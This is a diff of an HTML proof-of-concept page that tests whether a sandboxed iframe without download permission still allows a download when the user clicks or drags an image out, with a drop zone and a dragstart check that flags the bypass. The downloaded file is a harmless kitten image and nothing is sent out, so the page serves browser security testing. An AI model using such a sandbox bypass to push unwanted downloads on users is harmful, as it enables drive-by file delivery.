@@ -1,33 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Sandboxed Iframe Drag-and-Drop Download PoC</title>
+  <title>Sandboxed Iframe Click + Drag-to-Desktop PoC</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; }
+    iframe { border: 2px solid black; margin-top: 20px; }
+    #dropzone {
+      margin-top: 30px;
+      width: 500px;
+      height: 200px;
+      border: 2px dashed #333;
+      line-height: 200px;
+      color: #555;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <h2>PoC: Drag the image out of the iframe</h2>
+  <h2>PoC: Click or Drag the Kitten</h2>
   <p>
-    Expected: Sandbox without <code>allow-downloads</code> should block file download.  
-    Vulnerable: If you can drag this image to your desktop and it saves as <code>pwned.png</code>.
+    Expected: Without <code>allow-downloads</code>, clicking inside the sandbox should NOT start a download, and dragging the image outside should NOT work.  
+    Vulnerable: If clicking or dragging the kitten works, the sandbox is bypassed.
   </p>
 
+  <!-- Sandboxed iframe -->
   <iframe
     sandbox
-    width="320"
-    height="220"
+    width="500"
+    height="500"
     srcdoc="
       <style>
         body { font-family: sans-serif; text-align: center; }
-        img { border: 3px solid red; cursor: grab; }
+        img { border: 3px solid red; cursor: grab; width: 450px; height: auto; }
       </style>
-      <h3>Drag Me Out</h3>
-      <img
-        src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFklEQVR42mNk+M9Qz0AEYBxVSFUBAA0FAf/XHEujAAAAAElFTkSuQmCC'
-        download='pwned.png'
-        draggable='true'
-        alt='Test Image'
-      >
-      <p>Drag this image to your desktop</p>
+      <h3>Click or Drag Me</h3>
+      <a href='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfHyDiN5Mxk5DhynJTtxblc5mZKsUYHpIiv6tA3xgOoCWRynmvS9yegMM&s=10' download='kitten.jpg'>
+        <img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfHyDiN5Mxk5DhynJTtxblc5mZKsUYHpIiv6tA3xgOoCWRynmvS9yegMM&s=10' alt='Kitten' draggable='true'>
+      </a>
+      <p>Click or drag to test sandbox</p>
+      <script>
+        const img = document.querySelector('img');
+        img.addEventListener('dragstart', (e) => {
+          // Optional: detect dragstart inside iframe
+          console.log('Drag started inside sandbox iframe');
+        });
+      </script>
     ">
   </iframe>
+
+  <!-- Drop zone for drag-and-drop test -->
+  <div id="dropzone">Drag the image here</div>
+
+  <script>
+    const dropzone = document.getElementById('dropzone');
+
+    dropzone.addEventListener('dragover', (e) => {
+      e.preventDefault();
+      dropzone.style.borderColor = 'green';
+    });
+
+    dropzone.addEventListener('dragleave', () => {
+      dropzone.style.borderColor = '#333';
+    });
+
+    dropzone.addEventListener('drop', (e) => {
+      e.preventDefault();
+      dropzone.style.borderColor = '#333';
+      const files = e.dataTransfer.files;
+      if (files.length > 0) {
+        dropzone.textContent = 'Dropped file: ' + files[0].name;
+      } else {
+        dropzone.textContent = 'Dropped something (maybe image from iframe?)';
+      }
+    });
+
+    // Detect drag-to-desktop (outside browser)
+    window.addEventListener('dragstart', (e) => {
+      console.log('Drag started on main window:', e);
+      // If dataTransfer has a URL or file, sandbox bypass might be happening
+      if (e.dataTransfer?.getData('DownloadURL')) {
+        alert('Sandbox bypass detected: drag-to-desktop may be allowed!');
+      }
+    });
+  </script>
 </body>
 </html>
